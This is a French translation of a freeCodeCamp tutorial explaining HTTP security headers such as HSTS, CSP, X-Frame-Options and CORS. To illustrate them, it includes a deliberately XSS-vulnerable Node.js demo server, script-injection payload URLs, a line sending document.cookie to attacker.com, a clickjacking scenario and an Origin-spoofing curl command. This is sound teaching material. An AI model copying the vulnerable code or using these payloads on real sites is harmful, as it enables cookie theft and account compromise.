---
title: Sécurisez votre application web avec ces en-têtes HTTP
subtitle: ''
author: freeCodeCamp
co_authors: []
series: null
date: '2018-09-26T20:51:29.000Z'
originalURL: https://freecodecamp.org/news/secure-your-web-application-with-these-http-headers-fd66e0367628
coverImage: https://cdn-media-1.freecodecamp.org/images/1*w0YcpMhPGBRBeQ25G9g-iA.jpeg
tags:
- name: https
  slug: https
- name: JavaScript
  slug: javascript
- name: Security
  slug: security
- name: 'tech '
  slug: tech
- name: Web Security
  slug: web-security
seo_title: Sécurisez votre application web avec ces en-têtes HTTP
seo_desc: 'By Alex Nadalin

  This is part 3 of a series on web security: part 2 was “Web Security: an introduction
  to HTTP”

  As we’ve seen in the previous parts of this series, servers can send HTTP headers
  to provide the client additional metadata around the resp...'
---

Par Alex Nadalin

_Ceci est la partie 3 d'une série sur la sécurité web : la partie 2 était « [Web Security: an introduction to HTTP](https://medium.freecodecamp.org/web-security-https-perspective-5fa07140f9b3) »_

Comme nous l'avons vu dans les parties précédentes de cette série, les serveurs peuvent envoyer des en-têtes HTTP pour fournir au client des métadonnées supplémentaires autour de la réponse, en plus d'envoyer le contenu que le client a demandé. Les clients sont alors autorisés à spécifier comment une ressource particulière doit être lue, mise en cache ou sécurisée.

Il existe actuellement un très large éventail d'en-têtes liés à la sécurité qui ont été implémentés par les navigateurs afin de rendre plus difficile pour les attaquants de tirer parti des vulnérabilités. Les paragraphes suivants tentent de résumer chacun d'entre eux en expliquant comment ils sont utilisés, quels types d'attaques ils empêchent, et un peu d'histoire derrière chaque en-tête.

#### HTTP Strict Transport Security (HSTS)

Depuis fin 2012, les partisans de HTTPS partout ont trouvé plus facile de forcer un client à toujours utiliser la version sécurisée du protocole HTTP, grâce à _HTTP Strict Transport Security_ : un très simple `Strict-Transport-Security: max-age=3600` indiquera au navigateur que pendant la prochaine heure (3600 secondes), il ne doit pas interagir avec l'application avec des protocoles non sécurisés.

Lorsque qu'un utilisateur essaie d'accéder à une application sécurisée par HSTS via HTTP, le navigateur refusera simplement de continuer, convertissant automatiquement les URL `http://` en `[https://](https://.)`[.](https://.)

Vous pouvez tester cela localement avec le code à [github.com/odino/wasec/tree/master/hsts](https://github.com/odino/wasec/tree/master/hsts). Vous devrez suivre les instructions dans le README (elles impliquent l'installation d'un certificat SSL de confiance pour `localhost` sur votre machine, via l'outil incroyable [mkcert](https://github.com/FiloSottile/mkcert)) puis essayer d'ouvrir `https://localhost:7889`.

Il y a 2 serveurs dans cet exemple, un HTTPS écoutant sur `7889`, et un HTTP sur le port `7888`. Lorsque vous accédez au serveur HTTPS, il essaiera toujours de vous rediriger vers la version HTTP, ce qui fonctionnera puisque qu'il n'y a pas de politique HSTS sur le serveur HTTPS. Si vous ajoutez plutôt le paramètre `hsts=on` dans votre URL, le navigateur convertira de force le lien dans la redirection en sa version `https://`. Puisque que le serveur à `7888` est uniquement HTTP, vous vous retrouverez à regarder une page qui ressemble plus ou moins à ceci. ?

![Image](https://cdn-media-1.freecodecamp.org/images/h0jofhckn9GcLIp1BIzn5-uJsXpqaXvn9sHm)

Vous vous demandez peut-être ce qui se passe la première fois qu'un utilisateur visite votre site web, car il n'y a pas de politique HSTS définie au préalable : les attaquants pourraient potentiellement tromper l'utilisateur vers la version `http://` de votre site web et perpétrer leur attaque là-bas, donc il y a encore place pour des problèmes. C'est une préoccupation valable, car HSTS est un mécanisme de _confiance à la première utilisation_. Ce qu'il essaie de faire, c'est de s'assurer que, une fois que vous avez visité un site web, le navigateur sait que les interactions ultérieures doivent utiliser HTTPS.

Une façon de contourner ce problème serait de maintenir une énorme base de données de sites web qui appliquent HSTS, ce que Chrome fait via [hstspreload.org](https://hstspreload.org/). Vous devez d'abord définir votre politique, puis visiter le site web et vérifier s'il est éligible pour être ajouté à la base de données. Par exemple, nous pouvons voir que Facebook est dans la liste.

![Image](https://cdn-media-1.freecodecamp.org/images/gABWk48lNT2eTc9lJDpZYJjWGsrE7gWAw4gB)

En soumettant votre site web à cette liste, vous pouvez dire aux navigateurs à l'avance que votre site utilise HSTS, de sorte que même la première interaction entre les clients et votre serveur se fera via un canal sécurisé. Mais cela a un coût, car vous devez vraiment vous engager à utiliser HSTS. Si, par hasard, vous souhaitez que votre site web soit retiré de la liste, ce n'est pas une tâche facile pour les fournisseurs de navigateurs :

> Soyez conscient que l'inclusion dans la liste de préchargement ne peut pas être facilement annulée.

> Les domaines peuvent être retirés, mais cela prend des mois pour qu'un changement atteigne les utilisateurs avec une mise à jour de Chrome et nous ne pouvons pas faire de garanties concernant les autres navigateurs. Ne demandez pas l'inclusion à moins d'être sûr de pouvoir supporter HTTPS pour l'ensemble de votre site et tous ses sous-domaines à long terme.

> Source : [https://hstspreload.org/](https://hstspreload.org/)

Cela se produit parce que le fournisseur ne peut pas garantir que tous les utilisateurs seront sur la dernière version de leur navigateur, avec votre site retiré de la liste. Réfléchissez bien, et prenez une décision basée sur votre degré de confiance en HSTS et votre capacité à le supporter à long terme.

### HTTP Public Key Pinning (HPKP)

HTTP Public Key Pinning est un mécanisme qui nous permet d'informer le navigateur des certificats SSL à attendre chaque fois qu'il se connecte à nos serveurs. C'est un en-tête de _confiance à la première utilisation_, tout comme HSTS, ce qui signifie que, une fois le client connecté à notre serveur, il stockera les informations du certificat pour les interactions ultérieures. Si, à un moment donné, le client détecte qu'un autre certificat est utilisé par le serveur, il refusera poliment de se connecter, rendant les attaques de type _man in the middle_ (MITM) très difficiles à réaliser.

Voici à quoi ressemble une politique HPKP :

```
Public-Key-Pins:  pin-sha256="9yw7rfw9f4hu9eho4fhh4uifh4ifhiu=";  pin-sha256="cwi87y89f4fh4fihi9fhi4hvhuh3du3=";  max-age=3600; includeSubDomains;  report-uri="https://pkpviolations.example.org/collect"
```

L'en-tête annonce quels certificats le serveur utilisera (dans ce cas, il y en a deux) en utilisant un hachage des certificats, et inclut des informations supplémentaires telles que la durée de vie de cette directive (`max-age=3600`), et quelques autres détails. Malheureusement, il n'y a pas d'intérêt à creuser plus profondément pour comprendre ce que nous pouvons faire avec le pinning de clé publique, car [cette fonctionnalité est en cours de dépréciation par Chrome](https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/he9tr7p3rZ8/eNMwKPmUBAAJ) - un signal que son adoption est destinée à chuter très bientôt.

La décision de Chrome n'est pas irrationnelle, mais simplement une conséquence des risques associés au pinning de clé publique. Si vous perdez votre certificat, ou faites simplement une erreur en testant, votre site web sera inaccessible aux utilisateurs qui ont visité le site plus tôt (pour la durée de la directive `max-age`, qui est généralement de semaines ou de mois).

En conséquence de ces conséquences potentiellement catastrophiques, l'adoption de HPKP a été extrêmement faible, et il y a eu des incidents où [des sites web de grande envergure ont été indisponibles](https://www.smashingmagazine.com/be-afraid-of-public-key-pinning/) en raison d'une mauvaise configuration. Tout bien considéré, Chrome a décidé que les utilisateurs étaient mieux sans la protection offerte par HPKP - et [les chercheurs en sécurité ne sont pas entièrement contre cette décision](https://scotthelme.co.uk/im-giving-up-on-hpkp/).

### Expect-CT

Alors que HPKP a été déprécié, un nouvel en-tête est intervenu pour empêcher les certificats SSL frauduleux d'être servis aux clients : `Expect-CT`.

Le but de cet en-tête est d'informer le navigateur qu'il doit effectuer des vérifications supplémentaires en « arrière-plan » pour s'assurer que le certificat est authentique : lorsqu'un serveur utilise l'en-tête `Expect-CT`, il demande fondamentalement au client de vérifier que les certificats utilisés sont présents dans les journaux publics de transparence des certificats (CT).

L'initiative de transparence des certificats est un effort dirigé par Google afin de fournir :

> Un cadre ouvert pour surveiller et auditer les certificats SSL en temps quasi réel.

> Plus précisément, la transparence des certificats permet de détecter les certificats SSL qui ont été émis par erreur par une autorité de certification ou acquis de manière malveillante auprès d'une autorité de certification par ailleurs irréprochable. Elle permet également d'identifier les autorités de certification qui sont devenues voyous et émettent des certificats de manière malveillante.

> _Source : [https://www.certificate-transparency.org/](https://www.certificate-transparency.org/)_

L'en-tête prend cette forme :

```
Expect-CT: max-age=3600, enforce, report-uri="https://ct.example.com/report"
```

Dans cet exemple, le serveur demande au navigateur de :

* activer la vérification CT pour l'application actuelle pendant une période de 1 heure (3600 secondes)
* `enforce` cette politique et empêcher l'accès à l'application si une violation se produit
* envoyer un rapport à l'URL donnée si une violation se produit

Le but de l'initiative de transparence des certificats est de détecter plus tôt, plus rapidement et plus précisément les certificats mal émis ou malveillants (et les autorités de certification voyous) que toute autre méthode utilisée auparavant.

En optant pour l'utilisation de l'en-tête `Expect-CT`, vous pouvez tirer parti de cette initiative pour améliorer la posture de sécurité de votre application.

### X-Frame-Options

Imaginez voir une page web comme celle-ci apparaître devant votre écran :

![Image](https://cdn-media-1.freecodecamp.org/images/GT-HQh6-8AzhaMnBWWxnvxei9WM8gHDLXJ5r)

Dès que vous cliquez sur le lien, vous réalisez que tout l'argent de votre compte bancaire a disparu. Que s'est-il passé ?

Vous avez été victime d'une attaque de _clickjacking_.

Un attaquant vous a dirigé vers son site web, qui affiche un lien très attrayant sur lequel cliquer. Malheureusement, il a également intégré dans la page un iframe de `votre-banque.com/transferer?montant=-1&[[attaquant@gmail.com]](https://odino.org/cdn-cgi/l/email-protection)` mais l'a caché en définissant son opacité à 0%. Ce qui s'est ensuite passé, c'est que vous avez pensé cliquer sur la page originale, en essayant de gagner un tout nouveau hummer, mais au lieu de cela, le navigateur a capturé un clic sur l'iframe, un clic dangereux qui a confirmé le transfert d'argent.

La plupart des systèmes bancaires nécessitent que vous spécifiiez un code PIN à usage unique pour confirmer les transactions, mais votre banque n'a pas suivi l'évolution des temps et tout votre argent a disparu.

L'exemple est assez extrême mais devrait vous permettre de comprendre quelles pourraient être les conséquences d'une [attaque de clickjacking](https://www.troyhunt.com/clickjack-attack-hidden-threat-right-in/). L'utilisateur a l'intention de cliquer sur un lien particulier, tandis que le navigateur déclenchera un clic sur la page « invisible » qui a été intégrée en tant qu'iframe.

J'ai inclus un exemple de cette vulnérabilité à [github.com/odino/wasec/tree/master/clickjacking](https://github.com/odino/wasec/tree/master/clickjacking). Si vous exécutez l'exemple et essayez de cliquer sur le lien « attrayant », vous verrez que le clic réel est intercepté par l'iframe, qui augmente son opacité pour qu'il soit plus facile pour vous de repérer le problème. L'exemple devrait être accessible à `[http://localhost:7888](http://localhost:7888:)`.

![Image](https://cdn-media-1.freecodecamp.org/images/7lE-ERJAYircB6-ioJkLr7uqdK8dWChvEe0R)

Heureusement, les navigateurs ont trouvé une solution simple au problème : `X-Frame-Options` (XFO) qui vous permet de décider si votre application peut être intégrée en tant qu'iframe sur des sites web externes. Popularisé par Internet Explorer 8, XFO a été introduit pour la première fois en 2009 et est toujours supporté par tous les principaux navigateurs.

Le fonctionnement est le suivant : lorsqu'un navigateur voit un iframe, il le charge et vérifie que son XFO permet son inclusion dans la page actuelle avant de le rendre.

![Image](https://cdn-media-1.freecodecamp.org/images/ekgfyt0xskpEn2drvtGwygk5HJlENW-sNkFc)

Les valeurs supportées sont :

* `DENY` : cette page web ne peut être intégrée nulle part. C'est le niveau de protection le plus élevé car il ne permet à personne d'intégrer notre contenu.
* `SAMEORIGIN` : seules les pages du même domaine que la page actuelle peuvent intégrer cette page. Cela signifie que `example.com/embedder` peut charger `example.com/embedded` tant que sa politique est définie sur `SAMEORIGIN`. C'est une politique plus souple qui permet aux propriétaires d'un site web particulier d'intégrer leurs propres pages dans leur application.
* `ALLOW-FROM uri` : l'intégration est autorisée depuis l'URI spécifié. Nous pourrions, par exemple, permettre à un site web externe et autorisé d'intégrer notre contenu en utilisant `ALLOW-FROM https://external.com`. Cela est généralement utilisé lorsque vous souhaitez permettre à un tiers d'intégrer votre contenu via un iframe

Un exemple de réponse HTTP qui inclut la politique XFO la plus stricte possible ressemble à ceci :

```
HTTP/1.1 200 OKContent-Type: application/jsonX-Frame-Options: DENY
```

```
...
```

Afin de montrer comment les navigateurs se comportent lorsque XFO est activé, nous pouvons simplement changer l'URL de notre exemple en `http://localhost:7888/?xfo=on`. Le paramètre `xfo=on` indique au serveur d'inclure `X-Frame-Options: deny` dans la réponse, et nous pouvons voir comment le navigateur restreint l'accès à l'iframe :

![Image](https://cdn-media-1.freecodecamp.org/images/oO4vlTWPKjSI09UfPXsHKEYy1S3tHFjSmxMA)

XFO était considéré comme le meilleur moyen de prévenir les attaques de clickjacking basées sur les frames jusqu'à ce qu'un autre en-tête entre en jeu des années plus tard, la politique de sécurité du contenu ou CSP pour faire court.

### Content Security Policy (CSP)

L'en-tête `Content-Security-Policy`, souvent abrégé en CSP, fournit une ceinture utilitaire de nouvelle génération pour prévenir une pléthore d'attaques, allant du XSS (Cross-site Scripting) au clickjacking.

Pour comprendre comment CSP nous aide, nous devrions d'abord penser à un vecteur d'attaque. Supposons que nous venons de créer notre propre Google Search, un simple champ de texte avec un bouton de soumission.

![Image](https://cdn-media-1.freecodecamp.org/images/QzoYfkoOM4nUFKHNyrJgxlplIDBZCE0iMxWw)

Cette application web ne fait rien de magique. Elle se contente de,

* afficher un formulaire
* permettre à l'utilisateur d'exécuter une recherche
* afficher les résultats de la recherche ainsi que le mot-clé recherché par l'utilisateur

Lorsque nous exécutons une simple recherche, voici ce que l'application retourne :

![Image](https://cdn-media-1.freecodecamp.org/images/lukdqQSHBMXR-PY0IvpE9b2Oz3pWHYnzmvbR)

Incroyable ! Notre application a incroyablement compris notre recherche et a trouvé une image liée. Si nous creusons plus profondément dans le code source, disponible à [github.com/odino/wasec/tree/master/xss](https://github.com/odino/wasec/tree/master/xss), nous réaliserons bientôt que l'application présente un problème de sécurité, car tout mot-clé que l'utilisateur recherche est directement imprimé dans la réponse HTML servie au client :

```
var qs = require('querystring')var url = require('url')var fs = require('fs')
```

```
require('http').createServer((req, res) => {  let query = qs.parse(url.parse(req.url).query)  let keyword = query.search || ''  let results = keyword ? `You searched for "${keyword}", we found:</br>&lt;img src="http://placekitten.com/200/300" />` : `Try searching...`
```

```
res.end(fs.readFileSync(__dirname + '/index.html').toString().replace('__KEYWORD__', keyword).replace('__RESULTS__', results))}).listen(7888)
```

```
<html>  <body>    <h1>Search The Web</h1>    <form>      <input type="text" name="search" value="__KEYWORD__" />      <input type="submit" />    </form>    <div id="results">      __RESULTS__    </div>  </body></html>
```

Cela présente une conséquence désagréable. Un attaquant peut créer un lien spécifique qui exécute du JavaScript arbitraire dans le navigateur de la victime.

![Image](https://cdn-media-1.freecodecamp.org/images/VtzL41BTMMRCr1cRuiR7dNE1FJXnulUnekgM)

Si vous avez le temps et la patience d'exécuter l'exemple localement, vous pourrez rapidement comprendre la puissance de CSP. J'ai ajouté un paramètre de chaîne de requête qui active CSP, donc nous pouvons essayer de naviguer vers une URL malveillante avec CSP activé :

```
http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&csp=on
```

![Image](https://cdn-media-1.freecodecamp.org/images/qBt18fLr3rU0wQJtlXU5jUf1OslyIGzYcowX)

Comme vous le voyez dans l'exemple ci-dessus, nous avons dit au navigateur que notre politique CSP n'autorise que les scripts inclus depuis la même origine que l'URL actuelle, ce que nous pouvons facilement vérifier en interrogeant l'URL et en regardant l'en-tête de la réponse :

```
$ curl -I "http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&csp=on"
```

```
HTTP/1.1 200 OKX-XSS-Protection: 0Content-Security-Policy: default-src 'self'Date: Sat, 11 Aug 2018 10:46:27 GMTConnection: keep-alive
```

Puisque l'attaque XSS a été perpétrée via un _script en ligne_ (un script directement intégré dans le contenu HTML), le navigateur a poliment refusé de l'exécuter, gardant notre utilisateur en sécurité. Imaginez si, au lieu d'afficher simplement une boîte de dialogue d'alerte, l'attaquant avait mis en place une redirection vers son propre domaine, via un code JavaScript qui pourrait ressembler à :

```
window.location = `attacker.com/${document.cookie}`
```

Ils auraient pu voler tous les cookies de l'utilisateur, qui pourraient contenir des données hautement sensibles (plus d'informations à ce sujet dans le prochain article).

À présent, il devrait être clair comment CSP nous aide à prévenir une série d'attaques sur les applications web. Vous définissez une politique et le navigateur s'y conformera strictement, refusant d'exécuter des ressources qui violeraient la politique.

Une variation intéressante de CSP est le mode _report-only_. Au lieu d'utiliser l'en-tête `Content-Security-Policy`, vous pouvez d'abord tester l'impact de CSP sur votre site web en demandant au navigateur de simplement signaler les erreurs, sans bloquer l'exécution des scripts, etc., en utilisant l'en-tête `Content-Security-Policy-Report-Only`.

Le rapport vous permettra de comprendre quels changements cassants la politique CSP que vous souhaitez déployer pourrait causer, et de les corriger en conséquence. Nous pouvons même spécifier une URL de rapport et le navigateur nous enverra un rapport. Voici un exemple complet d'une politique en mode rapport uniquement :

```
Content-Security-Policy: default-src 'self'; report-uri http://cspviolations.example.com/collector
```

Les politiques CSP peuvent être un peu complexes en elles-mêmes, comme dans l'exemple suivant :

```
Content-Security-Policy: default-src 'self'; script-src scripts.example.com; img-src *; media-src medias.example.com medias.legacy.example.com
```

Cette politique définit les règles suivantes :

* les scripts exécutables (par exemple, JavaScript) ne peuvent être chargés que depuis `scripts.example.com`
* les images peuvent être chargées depuis n'importe quelle origine (`img-src: *`)
* le contenu vidéo ou audio peut être chargé depuis deux origines : `medias.example.com` et `medias.legacy.example.com`

Comme vous pouvez le voir, les politiques peuvent devenir longues, et si nous voulons assurer la plus haute protection pour nos utilisateurs, cela peut devenir un processus assez fastidieux. Néanmoins, écrire une politique CSP complète est une étape importante vers l'ajout d'une couche supplémentaire de sécurité à nos applications web.

Pour plus d'informations sur CSP, je recommanderais une plongée profonde à [developer.mozilla.org/en-US/docs/Web/HTTP/CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

### X-XSS-Protection

Bien que supplanté par CSP, l'en-tête `X-XSS-Protection` fournit un type de protection similaire. Cet en-tête est utilisé pour atténuer les attaques XSS dans les anciens navigateurs qui ne supportent pas pleinement CSP. Cet en-tête n'est pas supporté par Firefox.

Sa syntaxe est très similaire à ce que nous venons de voir :

```
X-XSS-Protection: 1; report=http://xssviolations.example.com/collector
```

Le XSS réfléchi est le type d'attaque le plus courant, où une entrée non assainie est imprimée par le serveur sans aucune validation, et c'est là que cet en-tête brille vraiment. Si vous souhaitez voir cela par vous-même, je vous recommande d'essayer l'exemple à [github.com/odino/wasec/tree/master/xss](https://github.com/odino/wasec/tree/master/xss) car, en ajoutant `xss=on` à l'URL, il montre ce que fait un navigateur lorsque la protection XSS est activée. Si nous entrons une chaîne malveillante dans notre boîte de recherche, telle que `<script>alert('hello')<`;/script>, le navigateur refusera poliment d'exécuter le script, et expliquera la raison derrière sa décision :

```
The XSS Auditor refused to execute a script in'http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&xss=on'because its source code was found within the request.The server sent an 'X-XSS-Protection' header requesting this behavior.
```

Encore plus intéressant est le comportement par défaut de Chrome lorsque la page web ne spécifie aucune politique CSP ou XSS, un scénario que nous pouvons tester en ajoutant le paramètre `xss=off` à notre URL (`http://localhost:7888/?search=%3Cscript%3Ealert%28%27hello%27%29%3C%2Fscript%3E&xss=off`) :

![Image](https://cdn-media-1.freecodecamp.org/images/RJc3aC5e-RJBFBe3taR8eAjIeNZ6g7qrP9KW)

Incroyable, Chrome est suffisamment prudent pour empêcher la page de se rendre, rendant le XSS réfléchi très difficile à réaliser. C'est impressionnant de voir à quel point les navigateurs ont évolué.

### Feature policy

En juillet 2018, le chercheur en sécurité [Scott Helme](https://scotthelme.co.uk/) a publié un [article de blog](https://scotthelme.co.uk/a-new-security-header-feature-policy/) très intéressant détaillant un nouvel en-tête de sécurité en préparation : `Feature-Policy`.

Actuellement supporté par très peu de navigateurs (Chrome et Safari au moment de la rédaction de cet article), cet en-tête nous permet de définir si une fonctionnalité spécifique du navigateur est activée dans la page actuelle. Avec une syntaxe très similaire à CSP, nous ne devrions avoir aucun problème à comprendre ce qu'une politique de fonctionnalité telle que la suivante signifie :

```
Feature-Policy: vibrate 'self'; push *; camera 'none'
```

Si nous avons encore quelques doutes sur la manière dont cette politique impacte les API du navigateur disponibles pour la page, nous pouvons simplement la disséquer :

* `vibrate 'self'` : cela permettra à la page actuelle d'utiliser l'API de vibration et tout contexte de navigation imbriqué (iframes) sur la même origine
* `push *` : la page actuelle et tout iframe peuvent utiliser l'API de notification push
* `camera 'none'` : l'accès à l'API de la caméra est refusé à la page actuelle et à tout contexte imbriqué (iframes)

La politique de fonctionnalité peut avoir une histoire courte, mais cela ne fait pas de mal de prendre de l'avance. Si votre site web permet aux utilisateurs de, par exemple, prendre un selfie ou enregistrer de l'audio, il serait assez bénéfique d'utiliser une politique qui restreint les autres contextes d'accéder à l'API via votre page.

### X-Content-Type-Options

Parfois, les fonctionnalités intelligentes des navigateurs finissent par nous nuire d'un point de vue sécurité. Un exemple clair est le MIME-sniffing, une technique popularisée par Internet Explorer.

Le MIME-sniffing est la capacité, pour un navigateur, à détecter automatiquement (et corriger) le type de contenu d'une ressource qu'il télécharge. Par exemple, nous demandons au navigateur de rendre une image à `/awesome-picture.png`, mais le serveur définit le mauvais type lors de son envoi au navigateur (par exemple, `Content-Type: text/plain`). Cela entraînerait généralement le navigateur à ne pas pouvoir afficher correctement l'image.

Pour corriger le problème, IE a fait de grands efforts pour implémenter une capacité de MIME-sniffing : lors du téléchargement d'une ressource, le navigateur la « scannait » et, s'il détectait que le type de contenu de la ressource n'était pas celui annoncé par le serveur dans l'en-tête `Content-Type`, il ignorait le type envoyé par le serveur et interprétait la ressource selon le type détecté par le navigateur.

Maintenant, imaginez héberger un site web qui permet aux utilisateurs de télécharger leurs propres images, et imaginez un utilisateur téléchargeant un fichier `/test.jpg` qui contient du code JavaScript. Voyez-vous où cela mène ? Une fois le fichier téléchargé, le site l'inclurait dans son propre HTML et, lorsque le navigateur essaierait de rendre le document, il trouverait l'« image » que l'utilisateur vient de télécharger. Alors que le navigateur télécharge l'image, il détecterait qu'il s'agit d'un script, et l'exécuterait sur le navigateur de la victime.

Pour éviter ce problème, nous pouvons définir l'en-tête `X-Content-Type-Options: nosniff` qui désactive complètement le MIME-sniffing : en faisant cela, nous disons au navigateur que nous sommes pleinement conscients que certains fichiers peuvent avoir une incompatibilité en termes de type et de contenu, et que le navigateur ne doit pas s'en soucier. Nous savons ce que nous faisons, donc le navigateur ne devrait pas essayer de deviner les choses, posant potentiellement une menace pour la sécurité de nos utilisateurs.

### Cross-Origin Resource Sharing (CORS)

Sur le navigateur, via JavaScript, les requêtes HTTP ne peuvent être déclenchées que sur la même origine. En termes simples, une requête AJAX de `example.com` ne peut se connecter qu'à `example.com`.

Cela est dû au fait que votre navigateur contient des informations utiles pour un attaquant - les cookies, qui sont généralement utilisés pour suivre la session de l'utilisateur. Imaginez si un attaquant mettait en place une page malveillante à `win-a-hummer.com` qui déclenche immédiatement une requête AJAX vers `your-bank.com`. Si vous êtes connecté sur le site web de la banque, l'attaquant pourrait alors exécuter des requêtes HTTP avec vos identifiants, volant potentiellement des informations ou, pire, vidant votre compte bancaire.

Il peut y avoir certains cas, cependant, qui nécessitent d'exécuter des requêtes AJAX cross-origin, et c'est la raison pour laquelle les navigateurs implémentent le partage de ressources cross-origin (CORS), un ensemble de directives qui permettent d'exécuter des requêtes cross-domain.

La mécanique derrière CORS est assez complexe, et il ne sera pas pratique pour nous de passer en revue toute la spécification, donc je vais me concentrer sur une version « épurée » de CORS.

Tout ce que vous devez savoir, pour l'instant, est qu'en utilisant l'en-tête `Access-Control-Allow-Origin`, votre application indique au navigateur qu'il est acceptable de recevoir des requêtes d'autres origines.

La forme la plus souple de cet en-tête est `Access-Control-Allow-Origin: *`, qui permet à toute origine d'accéder à notre application, mais nous pouvons la restreindre en ajoutant simplement l'URL que nous voulons mettre sur liste blanche avec `Access-Control-Allow-Origin: [https://example.com](https://example.com.)`[.](https://example.com.)

Si nous regardons l'exemple à [github.com/odino/wasec/tree/master/cors](https://github.com/odino/wasec/tree/master/cors), nous pouvons clairement voir comment le navigateur empêche l'accès à une ressource sur une origine séparée. J'ai configuré l'exemple pour faire une requête AJAX de `test-cors` à `test-cors-2`, et imprimer le résultat de l'opération dans le navigateur. Lorsque le serveur derrière `test-cors-2` est instruit d'utiliser CORS, la page fonctionne comme vous vous y attendez. Essayez de naviguer vers `[http://cors-test:7888/?cors=on](http://cors-test:7888/?cors=on:)`

![Image](https://cdn-media-1.freecodecamp.org/images/WyX59DsNIBOJ1WYyHEZ-nKGwemh74wUcPi2B)

Mais lorsque nous retirons le paramètre `cors` de l'URL, le navigateur intervient et nous empêche d'accéder au contenu de la réponse :

![Image](https://cdn-media-1.freecodecamp.org/images/oj5tc4uzmCB-cg81DSwwrOfI-XYJG5OZ40wP)

Un aspect important que nous devons comprendre est que le navigateur a exécuté la requête, mais a empêché le client d'y accéder. Cela est extrêmement important, car cela nous laisse toujours vulnérables si notre requête avait déclenché un effet secondaire sur le serveur. Imaginez, par exemple, si notre banque permettait le transfert d'argent en appelant simplement l'URL `my-bank.com/transfer?amount=1000&from=me&to=attacker`. Ce serait une catastrophe !

Comme nous l'avons vu au début de cet article, les requêtes `GET` sont censées être idempotentes, mais que se passerait-il si nous essayions de déclencher une requête `POST` ? Heureusement, j'ai inclus ce scénario dans l'exemple, donc nous pouvons l'essayer en naviguant vers `[http://cors-test:7888/?method=POST](http://cors-test:7888/?method=POST:)`[:](http://cors-test:7888/?method=POST:)

![Image](https://cdn-media-1.freecodecamp.org/images/Xd4kcvEnUyTTLTZlDrJbG2ao3aKvwrho-3vr)

Au lieu d'exécuter directement notre requête `POST`, qui pourrait potentiellement causer de sérieux problèmes sur le serveur, le navigateur a envoyé une requête « preflight ». Ce n'est rien d'autre qu'une requête `OPTIONS` au serveur, lui demandant de valider si notre origine est autorisée. Dans ce cas, le serveur n'a pas répondu positivement, donc le navigateur arrête le processus, et notre requête `POST` n'atteint jamais la cible.

Cela nous apprend quelques choses :

* CORS n'est pas une spécification simple. Il y a plusieurs scénarios à garder à l'esprit et vous pouvez facilement vous emmêler dans les nuances des fonctionnalités telles que les requêtes preflight.
* Ne jamais exposer d'API qui changent d'état via `GET`. Un attaquant peut déclencher ces requêtes sans une requête preflight, ce qui signifie qu'il n'y a aucune protection

Par expérience, je me suis senti plus à l'aise avec la mise en place de proxies qui peuvent transférer la requête au bon serveur, tout cela en backend, plutôt qu'en utilisant CORS. Cela signifie que votre application fonctionnant sur `example.com` peut configurer un proxy sur `example.com/_proxy/other.com`, de sorte que toutes les requêtes tombant sous `_proxy/other.com/*` soient proxyfiées vers `other.com`.

Je vais conclure mon aperçu de cette fonctionnalité ici mais, si vous êtes intéressé à comprendre CORS en profondeur, MDN a un article très long qui couvre brillamment toute la spécification à [developer.mozilla.org/en-US/docs/Web/HTTP/CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).

### X-Permitted-Cross-Domain-Policies

Très lié à CORS, `X-Permitted-Cross-Domain-Policies` cible les politiques cross-domain pour les produits Adobe (notamment Flash et Acrobat).

Je ne vais pas entrer dans les détails, car il s'agit d'un en-tête qui cible des cas d'utilisation très spécifiques. En bref, les produits Adobe gèrent les requêtes cross-domain via un fichier `crossdomain.xml` à la racine du domaine cible de la requête, et `X-Permitted-Cross-Domain-Policies` définit les politiques d'accès à ce fichier.

Cela semble compliqué ? Je recommanderais simplement d'ajouter un `X-Permitted-Cross-Domain-Policies: none` et d'ignorer les clients souhaitant effectuer des requêtes cross-domain avec Flash.

### Referrer-Policy

Au début de notre carrière, nous avons probablement tous fait la même erreur. Utiliser l'en-tête `Referer` pour implémenter une restriction de sécurité sur notre site web. Si l'en-tête contient une URL spécifique dans une liste blanche que nous définissons, nous allons laisser les utilisateurs passer.

D'accord, peut-être que ce n'était pas le cas de chacun d'entre nous. Mais je suis sûr d'avoir fait cette erreur à l'époque. Faire confiance à l'en-tête `Referer` pour nous donner des informations fiables sur l'origine de l'utilisateur. L'en-tête était vraiment utile jusqu'à ce que nous réalisions que l'envoi de ces informations aux sites pouvait poser une menace potentielle pour la vie privée de nos utilisateurs.

Né au début de 2017 et actuellement supporté par tous les principaux navigateurs, l'en-tête `Referrer-Policy` peut être utilisé pour atténuer ces préoccupations en matière de confidentialité en indiquant au navigateur qu'il doit masquer l'URL dans l'en-tête `Referer`, ou l'omettre complètement.

Certaines des valeurs les plus courantes que `Referrer-Policy` peut prendre sont :

* `no-referrer` : l'en-tête `Referer` sera entièrement omis
* `origin` : transforme `https://example.com/private-page` en `[https://example.com/](https://example.com/)`
* `same-origin` : envoie le `Referer` aux origines du même site mais l'omet pour les autres

Il est intéressant de noter qu'il existe beaucoup plus de variations de `Referrer-Policy` (`strict-origin`, `no-referrer-when-downgrade`, etc.), mais celles que j'ai mentionnées ci-dessus couvriront probablement la plupart de vos cas d'utilisation. Si vous souhaitez mieux comprendre chaque variation que vous pouvez utiliser, je vous recommande de consulter la [page dédiée de l'OWASP](https://www.owasp.org/index.php/OWASP_Secure_Headers_Project#rp).

L'en-tête `Origin` est très similaire au `Referer`, car il est envoyé par le navigateur dans les requêtes cross-domain pour s'assurer que l'appelant est autorisé à accéder à une ressource sur un domaine différent. L'en-tête `Origin` est contrôlé par le navigateur, donc il n'y a aucun moyen pour les utilisateurs malveillants de le falsifier. Vous pourriez être tenté de l'utiliser comme un pare-feu pour votre application web : si l'`Origin` est dans notre liste blanche, laissez la requête passer.

Une chose à considérer, cependant, est que d'autres clients HTTP tels que cURL peuvent présenter leur propre origine : un simple `curl -H "Origin: example.com" api.example.com` rendra toutes les règles de pare-feu basées sur l'origine inefficaces... et c'est pourquoi vous ne pouvez pas vous fier à l'`Origin` (ou au `Referer`, comme nous venons de le voir) pour construire un pare-feu pour éloigner les clients malveillants.

